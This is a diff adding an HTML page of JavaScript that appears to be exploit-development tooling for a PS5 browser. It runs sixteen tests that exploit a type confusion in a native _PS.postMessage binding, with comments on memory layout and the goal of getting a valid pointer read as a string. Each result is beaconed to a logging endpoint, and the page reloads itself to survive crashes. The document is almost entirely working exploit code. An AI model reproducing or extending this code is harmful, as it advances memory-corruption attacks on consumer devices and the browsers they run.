@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P844v10</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function bn(tag,data){
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/ps5_beacon.php?tag='+encodeURIComponent(tag)+'&data='+encodeURIComponent(data||''),false);
+    x.send();
+  }catch(e){}
+}
+
+var KEY='p844v10_test';
+function getTest(){try{return parseInt(localStorage.getItem(KEY))||0;}catch(e){return 0;}}
+function setTest(n){try{localStorage.setItem(KEY,String(n));}catch(e){}}
+function clearTest(){try{localStorage.removeItem(KEY);}catch(e){}}
+
+var testNum=getTest();
+log('P844v10 BOOT test='+testNum);
+bn('P844v10-BOOT','test='+testNum);
+
+// _PS.postMessage type confusion: toString returns object → C++ reads as JSString
+// JSString layout: +0x00=JSCell(8B), +0x08=m_value(StringImpl*)
+// JSObject layout: +0x00=JSCell(8B), +0x08=butterfly(Butterfly*)
+// If butterfly is valid, C++ follows it as StringImpl → reads "string" from property storage
+// Goal: find an object type whose +0x08 is a valid pointer AND doesn't crash
+
+var pm=_PS.postMessage;
+
+var TESTS=[
+  // T0: SAFE BASELINE — toString returns real string (must not crash)
+  function T0(){
+    var r;
+    try{r=pm.call(_PS,{toString:function(){return 'safe';}});}catch(e){r='err:'+e.message;}
+    return 'baseline='+r;
+  },
+  // T1: Object with 50 properties (force butterfly allocation)
+  // Butterfly should be heap-allocated → valid pointer at +0x08
+  function T1(){
+    var obj={};
+    for(var i=0;i<50;i++)obj['prop'+i]=0; // all zeros → m_length=0 → empty string?
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return obj;}});}catch(e){r='err:'+e.message;}
+    return 'obj50='+r;
+  },
+  // T2: Array with 50 elements (array has butterfly for element storage)
+  function T2(){
+    var arr=new Array(50);
+    for(var i=0;i<50;i++)arr[i]=0;
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return arr;}});}catch(e){r='err:'+e.message;}
+    return 'arr50='+r;
+  },
+  // T3: Object with properties set to specific doubles
+  // If butterfly[0] = 0 as float64, StringImpl.m_refCount=0, m_length=0 → empty string
+  function T3(){
+    var obj={};
+    // Property 0 needs to make m_length=0
+    // float64 0.0 = 0x0000000000000000 → m_refCount=0, m_length=0
+    for(var i=0;i<30;i++)obj['q'+i]=0.0;
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return obj;}});}catch(e){r='err:'+e.message;}
+    return 'doubles0='+r;
+  },
+  // T4: Typed Array — different internal layout than JSObject
+  // TypedArray +0x08 might be backing store pointer (valid!)
+  function T4(){
+    var ta=new Uint8Array(64);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return ta;}});}catch(e){r='err:'+e.message;}
+    return 'u8arr='+r;
+  },
+  // T5: BigUint64Array — same as T4 but 64-bit
+  function T5(){
+    var ba=new BigUint64Array(8);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return ba;}});}catch(e){r='err:'+e.message;}
+    return 'bu64='+r;
+  },
+  // T6: ArrayBuffer directly
+  function T6(){
+    var ab=new ArrayBuffer(64);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return ab;}});}catch(e){r='err:'+e.message;}
+    return 'ab='+r;
+  },
+  // T7: DataView
+  function T7(){
+    var dv=new DataView(new ArrayBuffer(64));
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return dv;}});}catch(e){r='err:'+e.message;}
+    return 'dv='+r;
+  },
+  // T8: Map object (complex internal structure)
+  function T8(){
+    var m=new Map();
+    for(var i=0;i<20;i++)m.set('k'+i,i);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return m;}});}catch(e){r='err:'+e.message;}
+    return 'map='+r;
+  },
+  // T9: Regular expression (has internal compiled code pointer)
+  function T9(){
+    var re=/test/gi;
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return re;}});}catch(e){r='err:'+e.message;}
+    return 'regex='+r;
+  },
+  // T10: new String("hello") — wrapper around string primitive
+  function T10(){
+    var so=new String("hello world test");
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return so;}});}catch(e){r='err:'+e.message;}
+    return 'strObj='+r;
+  },
+  // T11: Function object
+  function T11(){
+    var fn=function testfn(a,b,c){return a+b+c;};
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return fn;}});}catch(e){r='err:'+e.message;}
+    return 'fn='+r;
+  },
+  // T12: Promise object
+  function T12(){
+    var p=Promise.resolve("hello");
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return p;}});}catch(e){r='err:'+e.message;}
+    return 'promise='+r;
+  },
+  // T13: Error object (has stack trace with addresses?)
+  function T13(){
+    var e=new Error("test error");
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return e;}});}catch(e2){r='err:'+e2.message;}
+    return 'error='+r;
+  },
+  // T14: Date object
+  function T14(){
+    var d=new Date();
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return d;}});}catch(e){r='err:'+e.message;}
+    return 'date='+r;
+  },
+  // T15: WeakRef wrapping a large object
+  function T15(){
+    var big={};for(var i=0;i<100;i++)big['x'+i]=new ArrayBuffer(64);
+    var wr=new WeakRef(big);
+    var r='none';
+    try{r=pm.call(_PS,{toString:function(){return wr;}});}catch(e){r='err:'+e.message;}
+    return 'weakref='+r;
+  }
+];
+
+var NAMES=['T0-baseline','T1-obj50','T2-arr50','T3-doubles0','T4-u8arr','T5-bu64',
+  'T6-ab','T7-dv','T8-map','T9-regex','T10-strObj','T11-fn','T12-promise',
+  'T13-error','T14-date','T15-weakref'];
+
+function advance(){setTest(testNum+1);location.reload();}
+
+function runTest(){
+  if(testNum>=TESTS.length){
+    log('ALL '+TESTS.length+' TESTS COMPLETE');
+    bn('P844v10-DONE','all='+TESTS.length);
+    clearTest();
+    return;
+  }
+  var name=NAMES[testNum]||('T'+testNum);
+  log('Running '+name+'...');
+  bn('P844v10-'+name+'-PRE','starting');
+  try{
+    var result=TESTS[testNum]();
+    log(name+': '+result);
+    bn('P844v10-'+name+'-OK',String(result).substring(0,900));
+  }catch(e){
+    log(name+' EXCEPTION: '+e.message);
+    bn('P844v10-'+name+'-ERR',e.message);
+  }
+  advance();
+}
+
+setTimeout(runTest,200);
+</script>
+</body>
+</html>
